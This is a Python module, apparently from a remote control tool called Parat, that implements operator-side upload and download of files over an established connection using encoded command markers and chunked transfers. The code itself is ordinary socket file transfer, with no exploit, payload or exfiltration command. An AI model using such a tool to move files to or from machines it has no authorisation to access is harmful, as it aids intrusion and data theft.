#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

from os.path import isfile
from time import sleep
from lib.ParatPrint import colorize, pprint
from lib.ProcessThread import ParatProcessBar
from lib.ParatEncrypt import Encode, Decode


class ParatSharing:

    def __init__(self, conn, colors):

        self.handler = "#DATA_HANDLER"
        self.conn    = conn
        self.colors  = colors


    def upload(self, args):

        file_name = args[0]

        if file_name.strip() != "":

            if isfile(file_name):

                try:

                    self.conn.send(Encode("upload<#>" + file_name))
                    upload_file = open(file_name, "rb")
                    upload_data = upload_file.read(4096)
                    self.conn.send(Encode("#IS_FILE"))
                    sleep(0.1)

                    text = colorize(
                        "uploading",
                        colored=self.colors,
                        status="INF"
                    )
                    process_bar = ParatProcessBar(text)
                    process_bar.start_process()

                    while upload_data:
                        self.conn.send(upload_data)
                        sleep(0.1)
                        upload_data = upload_file.read(4096)

                    self.conn.send("#UPLOAD_END")
                    process_bar.Stop = True
                    sleep(0.2)
                    upload_file.close()

                    pprint(
                        colorize(
                            "Upload complete -> %s\n" % file_name,
                            colored=self.colors,
                            status="SUC"
                        ))

                except IOError:

                    self.conn.send(Encode("#NOT_FILE"))
                    pprint(
                        colorize(
                            file_name + " Not found.\n",
                            colored=self.colors,
                            status="ERR"
                        ), 1)
            else:
                pprint(
                    colorize(
                        "File not found: %s\n" % file_name,
                        colored=self.colors,
                        status="ERR"
                    ), 1)
        else:
            pprint(
                colorize(
                    "No specified file.\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)




    def download(self, args):

        file_name = args[0]

        if file_name != "":

            self.conn.send(Encode("download<#>" + file_name))
            recive_data = self.conn.recv(4096)

            if "File '%s' not found." % file_name in recive_data or "Unknown error" in recive_data:
                pprint(
                    colorize(
                        recive_data,
                        colored=self.colors,
                        status="ERR"
                    ), 1)

            else:
                recive_file = open(file_name.strip(), "wb")
                text = colorize(
                    "downloading",
                    colored=self.colors,
                    status="INF"
                )
                process_bar = ParatProcessBar(text)
                process_bar.start_process()

                while recive_data:
                    recive_file.write(recive_data)
                    sleep(0.1)
                    recive_data = self.conn.recv(4096)

                    if self.handler in recive_data:
                        process_bar.Stop = True; break

                recive_file.close()
                process_bar.Stop = True
                sleep(0.2)
                pprint(
                    colorize(
                        "Download complete -> %s\n" % file_name,
                        colored=self.colors,
                        status="SUC"
                    ))
        else:
            pprint(
                colorize(
                    "No specified file.\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)
